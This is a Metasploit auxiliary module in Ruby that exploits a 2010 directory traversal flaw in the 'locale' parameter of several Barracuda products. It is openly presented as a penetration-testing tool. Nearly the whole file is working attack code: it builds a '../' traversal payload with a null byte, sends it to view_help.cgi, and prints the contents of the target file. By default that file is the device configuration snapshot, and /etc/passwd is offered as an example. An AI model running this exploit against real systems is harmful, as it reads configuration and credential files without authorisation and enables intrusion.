##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Barracuda Multiple Product "locale" Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability present in
        several Barracuda products, including the Barracuda Spam and Virus Firewall,
        Barracuda SSL VPN, and the Barracuda Web Application Firewall. By default,
        this module will attempt to download the Barracuda configuration file.
      },
      'References'     =>
        [
          ['OSVDB', '68301'],
          ['URL', 'http://secunia.com/advisories/41609/'],
          ['EDB', '15130']
        ],
      'Author'         =>
        [
          'Tiago Ferreira <tiago.ccna[at]gmail.com>'
        ],
      'DisclosureDate' => 'Oct 08 2010',
      'License'        =>  MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", '/mail/snapshot/config.snapshot']),
        OptString.new('TARGETURI', [true, 'Barracuda vulnerable URI path', '/cgi-mod/view_help.cgi']),
      ])
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path)
    file = datastore['FILE']
    payload = "?locale=/../../../../../../..#{file}%00"

    print_status("#{full_uri} - Barracuda - Checking if remote server is vulnerable")

    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => uri + payload,
      }, 25)

    if res.nil?
      print_error("#{full_uri} - Connection timed out")
      return
    end

    if (res.code == 200 and res.body)
      if res.body.match(/\<html\>(.*)\<\/html\>/im)
        html = $1

        if res.body =~ /barracuda\.css/
          if html.length > 100
            file_data = html.gsub(%r{</?[^>]+?>}, '')

            print_good("#{full_uri} - Barracuda - Vulnerable")
            print_good("#{full_uri} - Barracuda - File Output:\n" + file_data + "\n")
          else
            print_error("#{full_uri} - Barracuda - Not vulnerable: HTML too short?")
          end
        elsif res.body =~ /help_page/
          print_error("#{full_uri} - Barracuda - Not vulnerable: Patched?")
        else
          print_error("#{full_uri} - Barracuda - File not found or permission denied")
        end
      else
        print_error("#{full_uri} - Barracuda - No HTML was returned")
      end
    else
      print_error("#{full_uri} - Barracuda - Unrecognized #{res.code} response")
    end

  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
  rescue ::Timeout::Error, ::Errno::EPIPE
  end
end
